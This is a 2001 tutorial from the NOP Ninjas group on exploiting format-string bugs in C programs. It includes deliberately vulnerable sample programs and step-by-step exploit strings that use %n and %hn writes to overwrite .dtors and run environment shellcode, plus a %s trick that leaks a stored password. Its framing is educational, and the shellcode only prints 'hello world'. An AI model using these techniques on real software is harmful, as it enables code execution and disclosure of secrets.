@@ -1,0 +1,630 @@
+                       .oO NOP Ninjas Oo.
+                presents: [Format String Technique]
+
+                       www.nopninjas.com
+
+
+
+
+
+
+       Author: sloth@nopninjas.com
+         Date: 12-09-01 
+      Version: v1.1 Revised 12/11/01
+
+
+
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+                     -=[Table Of Contents]=-
+
+1.0 Prerequisites
+
+2.0 Preface
+
+3.0 Formats
+ 3.1 More formatting
+ 3.2 Stack Offsets
+ 3.3 %n madness
+
+4.0 Exploiting basic format strings
+ 4.1 Finding the input arguments / Generating the debugging string
+ 4.2 Placing the shellcode / What to overwrite?
+ 4.3 Creating/Debugging the writing format string
+ 4.4 Finding the shellcode
+ 4.5 Creating the final string / Calculations
+ 4.6 Executing the string
+
+5.0 Shortening the format string
+
+6.0 Format strings on the heap
+ 6.1 Placing the addresses on the stack
+ 6.2 Finding hard to reach data
+ 6.3 Aligning the data
+ 6.4 Finishing touches
+
+7.0 Misc
+ 7.1 About blind and remote (non-stock binary) attacks
+ 7.2 Types of real world format strings
+ 7.3 How to abuse %s
+
+8.0 Information
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+1.0 Prerequisites
+
+Required:
+     Knowledge of gdb, Linux memory allocation, and ELF executable format. 
+     C string formatting
+     Little endian byte ordering
+Helpful but Optional
+     Easyflow http://www.nopninjas.com/easy.tgz
+              http://lamagra.sekure.de/
+     Scut from TESO: paper on format strings
+                 
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-        
+  
+2.0 Preface
+
+  This document is not a definitive guide to exploiting format strings.
+Other useful information will come from experimenting.  I hope this
+paper will explain how things are done in a somewhat easy to understand 
+manner. I have tried to demonstrate as much as possible through examples
+(wherever possible).
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+3.0 Formats
+
+  First format strings in c should be examined.  There are only a few format 
+characters from the entire that are relevant to this discussion.  Any search 
+engine should yield a more thorough list of websites with further information. 
+
+  %x  - Print the hex value of the argument.
+  %s  - The char string at the address passed to it.
+  %d  - For our purposes this will just print strings of data for
+        incrementing bytes. Should not be used, can create unwanted
+        output.
+  %u  - For our purposes this will just print strings of data for
+        incrementing bytes. This is unsigned as compared to %d
+        which is signed. This will drop any negative values that 
+        could possibly add a - into the output.
+  %n  - Write the number of bytes previously written to the address  
+        given.
+
+  Functions that use formatting are vulnerable when the programmer does
+not properly format the data before passing it.
+
+  incorrect: printf(string);
+    correct: printf("%s", string);
+
+This simple mistake could lead to a big security risk. All of the printf
+family of functions have this type of problem: (printf, fprintf, sprintf,
+snprintf, vsprintf, vsnprintf, etc). There are also other functions which may 
+use formats (like syslog). 
+
+
+3.1 More formatting
+
+  Since there are not any arguments given by the programmer, it
+will take the first argument off the stack. With the "$" format modifier
+any of the passed arguments can be referenced. For example:
+
+  printf("%2$x %1$x\n", 0x1, 0x2);
+
+would output:
+
+  "2 1"
+
+
+3.2 Stack offsets
+  
+  It is assumed that the reader has some knowledge of how the stack works but 
+it is not required. The most important thing that must be learned is the 
+layout of where input data lies in relation to the current stack position. The 
+crude diagram shows the layout as so:
+
+ Bottom                                         Top 
+ [ user stack ][ command line args ][ environment ]
+
+As noted, this is a crude diagram to illustrate the general layout. The 
+current position will be somewhere in the user stack.  It is possible to pop
+arguments off the stack to be displayed in hex with %x.  With multiple %x
+formats it is possible to reach the top of the stack. 
+  Using the "$" modifier any argument can be directly accessed by its stack 
+offset. Instead of a long strings of %x's there could be one "%95$x". Being
+able to access user input via stack offsets it crucial to the exploitation 
+of format strings. 
+
+3.3 %n madness
+
+  The %n format is used to write the amount of bytes already written into the 
+specified (int) argument. When there is no argument given, it writes to the 
+next argument on the stack. %n can be formatted with the "$" modifier to 
+select any argument offset. %hn does the same thing but with the type (short). 
+Here is an example of how it can be used:
+
+  int main(int argc, char *argv[]) {
+    int num;
+
+    printf("%s%n\n", argv[1], &num);
+    printf("Bytes written: %p\n", num);
+  }
+
+  sloth@sin:~/source/nopninjas$ ./test 1234567890
+  1234567890
+  Bytes written: 
+
+Notice that 0xa = 10. To write 0xbfff, write 49151 characters into argv[1]. 
+To test this out:
+
+  sloth@sin$ ./test `perl -e 'print "A"x49151'`
+  ... lots of A's ...
+  Bytes written: 0xbfff
+
+  This method can be abused and given an arbitrary address. This is what makes
+format strings lethal.
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+4.0 Exploiting basic format strings
+
+  It is not always simple to place the input data somewhere on the stack
+where it is easily reached.  The following is a very simple demonstration:
+
+fmt1.c ----------------------------------------------------
+
+int main(int argc, char *argv[]) {
+  char buf[1024];
+
+  strncpy(buf, argv[1], sizeof(buf));
+  printf(argv[1]);          
+  printf("\n");
+}
+
+------------------------------------------------------------  
+
+sloth@sin$ ./fmt 'AAAA %x'
+AAAA 41414141
+
+
+4.1 Finding the input arguments / Generating the debugging string
+
+  The input is the next argument on the stack. Next expand the string into a 
+more realistic form so that that the offsets on the stack will match up after 
+changing the command line arguments.  Use easyflow during the testing phase
+of writing format string exploits. Either the UNIX printf command in the shell
+or Perl will suffice. Keep in mind the little endian byte ordering of the 
+addresses. easyfl: \l01020304 is the same as printf/perl: \x04\x03\x02\x01.
+
+sloth@sin$ ./fmt `easyfl '\l41414141\l42424242   \
+\l43434343\l44444444%.010u%1$x%.010u%2$x%.010u%3$x%.010u%4$x'`
+AAAABBBBCCCCDDDD109479558541414141111163859442424242  \
+11284816034343434314532461244444444
+sloth@sin$
+
+Here is the output with the values bracketed:
+AAAABBBBCCCCDDDD1094795585(41414141)1111638594(42424242)  \
+1128481603(43434343)145324612(44444444) 
+
+  Each of the 4 byte address strings will eventually point to locations in
+memory where writing is needed. Any 4 byte strings that are easily
+recognizable in a mess of data will do. If the %x offsets are correct,
+each of the address strings should be printed as hex in the order given.
+It is possible to put the brackets around the %x to make the output easier
+to read. In more complicated examples it may lead to changing the stack,
+throwing off the stack argument offset values.
+
+  The %.010u will print out 10 bytes of data. Later these will be modified
+to change the values that %n will write. Those 10 bytes will be written as
+0x0a into memory given that these are the first bytes written. Each following
+write will be an accumulation of bytes already written. For now, They are 
+there to keep the string as static in length as possible during testing to 
+reduce the chances of the offsets shifting.
+
+  Since the first address is at the first argument offset on the stack we
+could just use %x.  To conform with the rest of the string we can convert
+it to: %1$x. Each following address is selected by increasing the offset:
+%1$x %2$x %3$x %4$x.
+
+
+4.2 Placing the shellcode / What to overwrite?
+
+  For simplicity put the executable code into our environment:
+
+sloth@sin$ EXECSHELL=`easyfl '[200,\x90] \
+<linux.hello>'`
+sloth@sin$ export EXECSHELL
+
+  Also for simplicity, overwrite .dtors. Further information on overwriting 
+.dtors can be found at:
+  http://community.core-sdi.com/~juliano/dtors.txt 
+
+To find the beginning of the .dtors section use "nm <execname>" or some other 
+similar utility to view the symbols table. In gdb the .dtors address can be 
+obtained with "maintenance info sections".
+
+sloth@sin$ nm fmt
+... skipping ...
+080494a8 ? __DTOR_END__
+080494a4 ? __DTOR_LIST__
+... skipping
+
+Here is the stripped output from nm. The address that needs to be written is 
+4 bytes past the start of the .dtors section: 0x080494a4 + 4 = 0x080494a8.
+
+
+4.3 Creating/Debugging the writing format string
+
+  Now that there is an address to write to, it will need to be put into the
+format string. Each of following addresses will need to be incremented by 1 to
+point to the next location in memory to write to.  0x080494a8 0x080494a9
+0x080494aa 0x080494ab
+
+sloth@sin$ ./fmt `easyfl '\l080494a8  \
+\l080494a9\l080494aa\l080494ab%.010u%1$n%.010u%2$n%.010u%3$n  \
+%.010u%4$n'`
+... output not useful ...
+Segmentation fault (core dumped)
+sloth@sin$
+
+sloth@sin$ gdb fmt core
+GNU gdb 5.0
+Copyright 2000 Free Software Foundation, Inc.
+... skipping ...
+(gdb) bt
+#0  0x382e241a in ?? ()
+#1  0x8048479 in _fini ()
+#2  0x4003d80d in exit () from /lib/libc.so.6
+#3  0x4003557d in __libc_start_main () from /lib/libc.so.6
+(gdb)
+
+This shows that it crashed during the destructor phase (_fini). 
+The current EIP seems quite random at the moment because each
+byte has not been adjusted yet.
+
+
+4.4 Finding the shellcode
+
+  The address to the executable code in this environment will need to be
+found. gdb is the way to go. This topic is covered in the suggested reading 
+material.
+
+sloth@sin$ gdb fmt core
+GNU gdb 5.0
+Copyright 2000 Free Software Foundation, Inc.
+... blah blah ...
+#0  0x382e241a in ?? ()
+(gdb) x/2000x $ebp
+0xbffff854: 0xbffff860      0x08048479      0x401019b4      0xbffff874
+0xbffff864: 0x4003d80d      0x401019b4      0x4000aa70      0xbffff8c4
+0xbffff874: 0xbffff898      0x4003557d      0x00000001      0x00000002
+... pages of data in hex ...
+0xbffffec4: 0x2f65646b      0x3a6e6962      0x7273752f      0x6168732f
+0xbffffed4: 0x742f6572      0x666d7865      0x6e69622f      0x45584500
+0xbffffee4: 0x45485343      0x903d4c4c      0x90909090      0x90909090
+0xbffffef4: 0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffff04: 0x90909090      0x90909090      0x90909090      0x90909090
+... BINGO! ...
+
+  Starting from the EBP ($ebp in gdb) search for the hex representation of
+the NOP's in the shellcode with "x/x". Above, 0x90909090 is at 0xbfffff04.
+
+
+4.5 Creating the final string / Calculation
+
+  Always remember to write in order of least significant bit to most
+significant. In this case the %u before the first %n will be the one to
+increment. There are 2 ways to do this -- calculate how many more bytes are
+needed or guess and adjust as needed. In small examples like this one, the
+guess and check method will work; however, sometimes due to the lack of
+output it may be necessary to calculate it exactly.
+
+  0x382e241a can be broken down into each byte as it would be written.
+First, 0x1a (26 in decimal) shows that 26 bytes have been written before
+the %n. 16 bytes are the addresses 0x080494a8 0x080494a9 0x080494aa
+0x080494ab plus 10 more from "%.010u". The next byte 0x24 (36 in decimal)
+is a combination of the 26 previous bytes already written and another 10
+from the second "%.010u". 0x2e (46 in decimal) is another 10 bytes more
+than the last. The same is with 0x38.
+
+  It probably is not necessary to have to modify the least significant bit
+if the shellcode is longer than 256 bytes. Our new goal address to write
+is 0xbfffff1a.
+
+  0xbfffff1a = [191][255][255][ 26]
+  255 - 26(4*4+10 bytes for argument addresses + %.010u) = 229
+  255 - 255 = 0    <-- This means nothing has to be written for the 3rd
+
+  (amount needed) - (already written) = (amount left to write)
+
+  Subtract the amount of bytes already written from the amount of bytes
+needed. This will be the amount to put into the value for %u. Also, to
+jump ahead slightly, the next number is 255. This means that the same
+value can be reused in more accurate terms. Since it will have already
+written 255 bytes, the third %u can be removed. Here is the current string
+so far:
+
+  sloth@sin$ ./fmt `easyfl'\l080494a8\l080494a\l080494aa  \
+\l080494ab%.010u%1$n%.229u%2$n%3$n%.010u%4$n'`
+
+                                         Coming Soon.
+  Summary: [%.010u %1$n %.229u %2$n %3$n][%.010u %4$n]
+
+  If it is not possible to subtract bytes written without a negative answer,
+the last write will have to roll over into the next significant byte.
+
+        255 = 0xff
+  255 + 256 = 0x1ff   <-- roll over
+
+        191 = 0xbf
+  191 + 256 = 0x1bf(447)
+  447 - 255 = 192
+
+  192 bytes will have to be written with %u to get the last value in
+place. The final string should look like:
+
+  sloth@sin$ ./fmt `easyfl '\l080494a8\l080494a9\l080494aa  \
+\l080494ab%.010u%1$n%.229u%2$n%3$n%.192u%4$n'`
+
+  Summary: [%.010u %1$n %.229u %2$n %3$n %.192u %4$n]
+
+
+4.6 Executing the string
+
+  It's time to execute it and check the results. In the example the "hello
+world" shellcode was used. It will just print the string and exit. An
+extra "; echo" at the end will add a new line after the "hello world"
+because the default shellcode in easyfl does not contain a "\n".
+
+sloth@sin$ ./fmt `easyfl '\l080494a8\l080494a9\l080494aa \
+\l080494ab%.010u%1$n%.229u%2$n%3$n%.192u%4$n'`; echo
+013451792800000000000000000000000000000000000000000000000000000000  \
+000000000000000000000000000000000000000000000000000000000000000000  \
+000000000000000000000000000000000000000000000000000000000000000000  \
+000000000000000000000000000000001345179290000000000000000000000000  \
+000000000000000000000000000000000000000000000000000000000000000000  \
+000000000000000000000000000000000000000000000000000000000000000000  \
+00000000000000000000000000134517930
+hello world 
+sloth@sin$
+
+  The odd numbers inside the string of 0's are the arguments popped from the 
+stack by %u. If the "$" modifier is not used with %x or %n it would require 
+having buffer arguments to pass to %u.
+
+  [%u arg][%n arg][%u arg][%n arg][%u arg][%n arg][%u arg][%n arg]
+  real: [AAAA][\l080494a8][AAAA][\l080494a9] etc...
+
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+5.0 Shortening the format string
+
+  It is not necessary to use 4 write statements. It is possible to only
+use 2 writes, each of 2 bytes to write the data. This way other data is not
+accidently overwritten if it is necessary to roll a value into the next
+significant byte. It is also used to make the string even smaller.  For safety 
+%hn is employed here even though just %n could be used. Using the last example
+we can build our sample string.
+
+  The 2 locations that need to be written to (.dtors)
+  0x080494a8 0x080494a8+2  <-- The second argument address is 
+                               incremented by 2.
+
+  0xbfffff1a is still our shellcode address. We can break this up:
+
+  0xbfff = 49151
+  0xff1a = 65306
+
+  65306 - 8(bytes for addresses) = 65298(bytes left for %u to write)
+  49151 + 65536 = 0x1bfff
+  0x1bfff(total) - 0xff1a(already written) = 49381(needed)
+
+No more goofing around. Lets test it out:
+
+  sloth@sin$ ./fmt `easyfl '\l080494a8\l080494aa%.65298u%1$hn  \
+%.49381u%2$hn'`; echo
+  ... LOTS AND LOTS OF STUFF ...
+  hello world
+  sloth@sin$
+
+Yet another format string is broken. 
+
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+
+6.0 Format strings on the heap
+
+  For the next example the format string will be placed on the heap.
+Because this is a local hole, exploiting it should be fairly trivial.
+ 
+fmt2.c ----------------------------------------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[]) {
+  char *blah=malloc(1024);
+
+  fgets(blah, 1023, stdin);
+  printf(blah);
+}
+
+------------------------------------------------------------------
+
+6.1 Placing the addresses on the stack
+
+  Sometimes the input buffer to the format string is not on the stack. On
+a local system this is a simple task. The addresses can be placed as an
+argument string to the program or can be placed in the environment. Be careful
+for special characters that may not be passed such as \x00 on the command line.
+
+  sloth@sin$ export ADDYS="AAAAAAAA"
+  or
+  sloth@sin$ ./fmt2 'AAAAAAAA'  (must be done with each execution)
+
+
+6.2 Finding hard to reach data
+
+To find the general offset a simple bash loop can be used:
+
+  sloth@sin$ for (( I=1; I<500; I=`expr $I + 1` )); do      \
+( echo "$I %$I\$x" ) | ./fmt2 |grep 4141; done
+  364 4141413d
+  365 41414141
+
+
+6.3 Aligning the data
+
+  As you can see, the alignment is off because of the the rest of the data
+in the environment.
+
+  sloth@sin$ export ADDYS="AAAABBBB"
+  
+  sloth@sin$ (echo '%.00010u%364$x%.00010u%365$x') | ./fmt2 
+  Bracketed: 0134518248(4141413d)1073743880(42424241)
+
+Adding an alignment character to the string will fix the leaking characters.
+
+  sloth@sin$ export ADDYS="AAAABBBBX"
+  sloth@sin$ (echo '%.00010u%364$x%.00010u%365$x') | ./fmt2
+  Bracketed: 0134518248(41414141)1073743880(42424242)
+
+Everything is aligned now. It is time to put the addresses for .dtors into
+the environment.
+
+
+6.4 Finishing touches
+
+  sloth@sin$ export ADDYS=`easyfl '\l080494f4\l080494f6X'`
+
+This format string does not have any addresses or data printed before it.
+%u will have to write the exact amount for the first write.
+
+           0xff1a = 65306
+ 0x1bfff - 0xff1a = 49381
+
+  sloth@sin$ (echo '%.65306u%364$hn%.49381u%365$hn') | ./fmt2; echo
+  ... LOTS OF GARBAGE ...
+  hello world
+  sloth@sin$ 
+
+ Again the hello world shellcode is executed.
+
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+7.0 Misc Stuff
+
+
+7.1 About blind and remote(non-stock binary) attacks
+
+  When it comes down to blind or remote format strings it is necessary to
+be very precise. Exact calculations as well as stack dumps with %x can be very helpful. .dtors is really only useful when there is access to the binary. This 
+is all stuff that should be learned through experimentation.
+
+
+7.2 Types of real world format strings
+
+  fprintf, printf, sprintf, snprintf, vfprintf, vprintf, vsprintf,
+vsnprintf, setproctitle, syslog, and more. These are all commonly missused
+in the real world. Here is an example of a misused vsnprintf (a personal
+favorite).
+
+fmt4.c ------------------------------------------------
+
+#include <stdio.h>
+#include <stdarg.h>
+
+void printing(char *fmt, ...) {
+  va_list ap;
+  char output[1024];
+
+  va_start(ap, fmt);
+  vsnprintf(output, sizeof(output), fmt, ap);
+  printf("ARG: %s\n", output);
+  va_end(ap);
+}
+
+int main(int argc, char *argv[]) {
+  if(argc>1) printing(argv[1]); <-- printing() must be formatted
+
+/* correct usage */
+/* if(argc>1) printing("%s", argv[1]); */
+}
+
+----------------------------------------------------------
+
+7.3 How to abuse %s
+
+  With %s, any string in valid memory can be output. It could be a password, 
+user data, environment variables, or anything else that could be useful. Here 
+is a sample of how to abuse %s:
+
+password.c -----------------------------------------------
+
+  static char password[] = "hax0r";
+
+  int main(int argc, char *argv[]) {
+    char buf[256];
+
+    strncpy(buf, argv[1], sizeof(buf));
+    printf(buf);
+  }
+
+----------------------------------------------------------
+
+With the output of nm the address of password can be found. 
+
+  sloth@sin$ nm test
+  ... skipping ...
+  08049484 d password
+  ... skipping ...
+
+  0x08049484 is the address of password.
+
+  sloth@sin$ ./test `easyfl '\l08049484%s'`; echo
+  hax0r
+  sloth@sin$
+
+This is just a very basic example. Using %x to dump data off the heap, it could
+be possible to use that data with %s to find out more information about what 
+exactly is happening.
+
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+
+
+8.0 Information
+
+  www.nopninjas.com      - My stupid site. Links to resources, news, 
+                           and wargames.
+  www.pulltheplug.com    - Wargames collection (irc.pulltheplug.com
+                           vuln dev). Thanks to dies and all the 
+                           maintainers of the various servers. Also all 
+                           those who help others.
+                           http://bassd.labs.pulltheplug.com
+                           http://mainsource.labs.pulltheplug.com
+  hack.datafort.net      - More wargames
+  community.core-sdi.com - good stuff
+  www.rootsecurity.net   - Cool people [RsN] 
+                           Also runs bassd.labs.pulltheplug.com.
+
+
+
+
+
+
+         12/09/01 - www.nopninjas.com - sloth@nopninjas.com
+
+
+
+
+
+
+
